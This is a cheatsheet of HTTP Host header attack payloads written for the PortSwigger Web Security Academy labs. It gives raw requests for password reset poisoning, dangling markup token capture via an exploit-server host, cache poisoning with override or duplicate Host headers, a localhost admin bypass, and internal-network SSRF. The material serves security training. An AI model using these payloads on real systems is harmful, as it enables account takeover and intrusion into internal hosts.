# 🌐 HTTP Host Header Attacks Cheatsheet

Complete exploitation methodologies, header manipulation techniques, and payload construction for HTTP Host Header labs in PortSwigger Web Security Academy.

---

## 📌 Core Mechanisms & Identification

* **Implicit Trust:** Web applications often implicitly trust the `Host` header value to generate links, load dynamic resources, or route internal requests.
* **Ambiguous Parsing:** Discrepancies between front-end reverse proxies and back-end servers in how duplicate headers, absolute URLs, or connection states are parsed.
* **Override Headers:** Secondary headers (e.g., `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`) used by intermediaries to specify the original destination host.

---

## 🛠️ Detailed Breakdown & Payloads

### 1. Password Reset Poisoning & Markup Injection

**Basic password reset poisoning**
Intercept request and inject an attacker-controlled host into the `Host` header during a password reset request. The server generates a reset link pointing to the attacker's server:

```http
POST /forgot-password HTTP/1.1
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=victim
```

**Password reset poisoning via dangling markup**
Inject incomplete HTML tags into the `Host` header (or port field) to capture victim tokens when the server reflects the value into a link tag without escaping:

```http
POST /forgot-password HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net:'><a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
Content-Type: application/x-www-form-urlencoded

username=victim
```

---

### 2. Cache Poisoning & Authentication Bypass

**Web cache poisoning via ambiguous requests**
Exploit duplicate `Host` headers or override headers where the front-end cache uses the official `Host` header as the cache key, but the back-end application uses the malicious injected header/URL:

```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```
*Or using duplicate Host headers:*
```http
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

**Host header authentication bypass**
Bypass local access restriction checks by setting the `Host` header directly to localhost:

```http
GET /admin HTTP/1.1
Host: localhost
```

---

### 3. SSRF & Connection State Exploitation

**Routing-based SSRF (Collaborator)**
Exploit reverse proxies that route internal HTTP requests based on the `Host` header rather than internal IP configuration:

```http
GET / HTTP/1.1
Host: 192.168.0.(0/24)
```
*(Identify active internal hosts by brute-forcing the private IP range via Burp Intruder)*

**SSRF via flawed request parsing (Absolute URL)**
Supply an absolute URL in the request line while keeping the `Host` header pointed to an internal IP. The proxy routes using the `Host` header while the back-end processes the absolute URL, or vice-versa:

```http
GET [https://YOUR-LAB-ID.web-security-academy.net/](https://YOUR-LAB-ID.web-security-academy.net/) HTTP/1.1
Host: 192.168.0.(0-255)
```

**Host validation bypass via connection state attack**
Front-end proxies sometimes validate the `Host` header *only on the first request* of a persistent HTTP connection (`keep-alive`). Subsequent requests on the same TCP connection reuse the initial validation context:

```http
FIRST REQUEST (Validated):
GET / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Connection: keep-alive

SECOND REQUEST (Bypassed on same connection group):
GET /admin HTTP/1.1
Host: 192.168.0.1
Connection: keep-alive
```
*(In Burp Repeater: Create a Tab Group -> Set send mode to **"Send group in sequence (single connection)"**)*

---
